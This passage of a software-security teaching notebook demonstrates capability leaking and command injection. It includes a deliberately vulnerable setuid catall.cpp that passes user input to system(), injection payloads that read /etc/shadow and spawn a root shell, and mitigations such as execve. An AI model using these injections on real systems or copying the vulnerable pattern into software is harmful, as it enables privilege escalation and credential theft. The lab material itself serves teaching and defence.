      "drwxrwxrwx+ 22 codespace root  4096 Jan  3 00:55 ..\n",
      "-rw-rw-rw-   1 codespace root   420 Feb 10 20:10 Makefile\n",
      "-rw-rw-rw-   1 codespace root   769 Feb 10 18:29 capleak.cpp\n",
      "-rwsrwsrwx   1 root      root 22640 Feb 10 20:10 capleak.exe\n",
      "-rw-rw-rw-   1 codespace root    10 Feb 10 20:15 est.txt\n",
      "-rw-rw-rw-   1 codespace root    10 Feb 10 20:15 test.txt\n"
     ]
    }
   ],
   "source": [
    "! ls -al"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "39802b4e-3e17-4e85-b9c4-b584d5ffb198",
   "metadata": {},
   "source": [
    "```bash\n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/capleak]\n",
    "└─$ ./capleak \n",
    "fout is 3\n",
    "$ echo ABCDEF                                                                                              \n",
    "ABCDEF\n",
    "$ echo ABCDEF >& 3                                                                                       \n",
    "$ cat /etc/xyz                                                                                             \n",
    "aaa\n",
    "aaaa\n",
    "ABCDEF\n",
    "$ exit\n",
    "```\n",
    "\n",
    "## Fix the Vulnerability\n",
    "\n",
    "- close/destroy the file description before dropping the privelege\n",
    "\n",
    "## Capbility Leaking in OS X - Case Study\n",
    "\n",
    "- OS X Yosemite found vulnerable to privilege escalation attack related to capability leaking in July 2015 ( OS X 10.10 )\n",
    "- added features to dynamic linker dyld \n",
    "    - DYLD_PRINT_TO_FILE environment variable\n",
    "- the dynamic linker can open any file, so for root-owned Set-UID programs, it runs with root privileges \n",
    "- the dynamic linker dyld, does not close the file leading to capability leaking vulnerability\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "15394750-7b66-492e-9d1c-06b16cc53ad9",
   "metadata": {},
   "source": [
    "## Command Injection Vulnerability\n",
    "\n",
    "- programs' often takes input from users\n",
    "- if the users' input is not validated and sanitized, data can be converted into command name\n",
    "    - data is then executed as command\n",
    "- SQL injection is a type of command injection attack very common in SQL-driven web applications\n",
    "- see `catall.cpp` file in `demos/injection` folder"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "8cdb4adc-fd11-4f18-8ebf-7c08d07d12e4",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/workspaces/SoftwareSecurity/demos/capleak\n"
     ]
    }
   ],
   "source": [
    "! pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "5f767aba-4624-409a-ade3-1cf3098e7391",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/workspaces/SoftwareSecurity/demos/injection\n"
     ]
    }
   ],
   "source": [
    "%cd ../injection"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "68e08a6c-e103-4c05-9af7-6bbcfbf7e2a2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "total 40\n",
      "drwxrwxrwx+  3 codespace root  4096 Jan  3 00:09 .\n",
      "drwxrwxrwx+ 22 codespace root  4096 Jan  3 00:55 ..\n",
      "-rw-rw-rw-   1 codespace root   433 Jan  3 00:09 Makefile\n",
      "-rwxrwxrwx   1 codespace root 20368 Jan  3 00:09 catall\n",
      "-rw-rw-rw-   1 codespace root   522 Jan  3 00:09 catall.cpp\n",
      "drwxrwxrwx+  2 codespace root  4096 Jan  3 00:09 secure\n"
     ]
    }
   ],
   "source": [
    "! ls -al"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "be6af880-6128-4fe3-9cc3-cd221f9b112c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <unistd.h>\n",
      "#include <stdio.h>\n",
      "#include <stdlib.h>\n",
      "#include <string.h>\n",
      "\n",
      "int main(int argc, char *argv[])\n",
      "{\n",
      "    char *v[3];\n",
      "    char program[] = \"/bin/cat\";\n",
      "    char *command;\n",
      "    if (argc < 2)\n",
      "    {\n",
      "        printf(\"Usage: catall <file_path>.\\n\");\n",
      "        exit(EXIT_FAILURE);\n",
      "    }\n",
      "    v[0] = program; v[1] = argv[1]; v[2] = NULL;\n",
      "    command = (char *)malloc(strlen(v[0]) + strlen(v[1]) + 2);\n",
      "    sprintf(command, \"%s %s\", v[0], v[1]);\n",
      "    //printf(\"argv[1] = %s\\n\", argv[1]);\n",
      "    system(command);\n",
      "\n",
      "    return 0;\n",
      "}"
     ]
    }
   ],
   "source": [
    "! cat catall.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "18e70fcf-3717-498a-b31a-406bd8d92cf0",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "g++ -g -Wall -std=c++17 catall.cpp -o catall\n",
      "sudo chown root catall\n",
      "sudo chmod +s catall\n"
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S make"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "55e1c5f1-9368-41a6-95b9-3d37c9fc5709",
   "metadata": {},
   "source": [
    "- you must use the \"quotations\" around the commands \";\" separated arguments\n",
    "- quotes ensure everything is passed as a single argument to the vulnurable program\n",
    "- note, injecting /bin/zsh gives root but injecting  /bin/sh doesn not \n",
    "\n",
    "```bash\n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/injection]\n",
    "└─$ ./catall \"adf; cat /etc/shadow\"\n",
    "/bin/cat: adf: No such file or directory\n",
    "root:!:19662:0:99999:7:::\n",
    "...\n",
    "kali:$y$j9T$K/agt9PK0eYweoRVbd9yK0$6BUblkWhNb00ZJWw7nYm0fZL1bpF.1BAs5h0CRF4xj2:19662:0:99999:7:::\n",
    "bob:$y$j9T$KoIINXes24L0Z2qTeAdEX0$aNnlXFBUXuSZrsiCKPFPCxMIz/KNoz0gIzFnOppN2F1:19739:0:99999:7::\n",
    "\n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/injection]\n",
    "└─$ ./catall \"adf; /bin/bash\"\n",
    "/bin/cat: adf: No such file or directory\n",
    "bash-5.2$ whoami\n",
    "kali\n",
    "bash-5.2$ ./catall \"asdf; /bin/bash\"\n",
    "/bin/cat: asdf: No such file or directory\n",
    "bash-5.2$ exit\n",
    "exit\n",
    "bash-5.2$ exit\n",
    "exit\n",
    "                                                                                                                                                                                                                                                                                         \n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/injection]\n",
    "└─$ ./catall \"adf; /bin/zsh\" \n",
    "/bin/cat: adf: No such file or directory\n",
    "x86_64-conda-linux-gnu# whoami\n",
    "root\n",
    "x86_64-conda-linux-gnu# id\n",
    "uid=1000(kali) gid=1000(kali) euid=0(root) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),105(netdev),117(wireshark),120(bluetooth),133(scanner),140(kaboxer)\n",
    "x86_64-conda-linux-gnu# \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "641e510d-ad23-4829-b3f8-1fac0bfa2e8e",
   "metadata": {},
   "source": [
    "## Mitigation\n",
    "\n",
    "- avoid `system` call if possible\n",
    "- use `execve` properly instead of `system` when executing system commands from C/C++ programs\n",
    "- `execve` allows you to separate the command from the input data\n",
    "- `exec` family of function is lower-level compared to system and allows for granular control on how the program should be executed\n",
    "- allows you to pass your own environment variables in the third argument\n",
    "- replaces the current process image with a new one, executing the specified program\n",
    "- you need to provide full path to the executable and explictly pass an array of arguments\n",
    "    - preventing the ENV VARS overriding exploitation \n",
    "- not all `exec` family funcions behave similarly\n",
    "    - `execlp(), execvp(), execvpe()` duplicate the actions of the shell\n",
    "    - these functions can be attacked using the PATH Environment Variable\n",
    "    \n",
    "```bash\n",
    "execve(command_name, input_data_argument, env_variables);\n",
    "```\n",
    "\n",
    "- patch the `catall.cpp` program and try to exploit it again\n",
    "- see `demos/injection/secure` folder for the secure version of `cat_all` program\n",
    "- compile and try the command injection again..."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f289fca3-d745-4162-b025-2fd02db24f70",
   "metadata": {},
   "outputs": [],
   "source": [
    "! man execve"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "20772acb-515a-4ae5-8a1e-fe3e9bdce32c",
   "metadata": {},
   "source": [
    "```bash\n",
    "(base) ┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/injection/secure]\n",
    "└─$ ./secure_catall \"adfasdf; ls -al\"\n",
    "/bin/cat: 'adfasdf; ls -al': No such file or directory\n",
    "  \n",
    "  \n",
    "(base) ┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/injection/secure]\n",
    "└─$ ./secure_catall \"adfasdf; /bin/cat /etc/passwd\"\n",
    "/bin/cat: 'adfasdf; /bin/cat /etc/passwd': No such file or directory\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "03c11538-0713-4768-81ac-a1e8a6c8e2fa",
   "metadata": {},
   "source": [
    "## Invoking External Commands in Other Languages\n",
    "\n",
    "- risks of invoking external commands or command injection is not limited to C/C++ programs\n",
    "- goal is to avoid problems similar to those caused by the system() function\n",
    "- many languages allow system API, such as PHP, Perl, Python, etc.\n",
    "\n",
    "## Mitigating Attacks on SetUID Programs and Env Variables\n",
    "\n",
    "### Sanitize Untrusted Data\n",
    "\n",
    "- take extra precution on using untrested data\n",
    "- always sanitize user/untrusted data before using them in the application\n",
    "\n",
    "### Use Secure API Functions and Library\n",
    "\n",
    "- use `secure_getenv()` instead of `getenv()`\n",
    "\n",
    "### Use Principle of Isolation\n",
    "    \n",
    "- don't mix code with data\n",
    "- various vulnerabilities such as system() code execution, XSS (Cross-site scripting), SQL Injection, Buffer Overflows are consequences of mixing code with data\n",
    "\n",
    "### Use Principle of Least Privilege\n",
    "\n",
    "- a privileged program should be given the just the right amount of power required to perform its tasks\n",
    "- disable the privileges (temporarily or permenanently) when a privileged program doesn't need those\n",
    "- in Linux, seteuid() and setuid() can be used to downgrade/upgrade privilege when needed\n",
    "    - different OSes may provide different APIs\n",
    "    \n",
    "### Use Principle of Cleanup After\n",
    "\n",
    "- discard the resources after they're done being used\n",
    "- free/release memory used by dynamic variables created using **new**, **malloc**, etc.\n",
    "- close files and resources after their usages\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e8ec089d-6c1a-409b-9026-53d517b02bf6",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
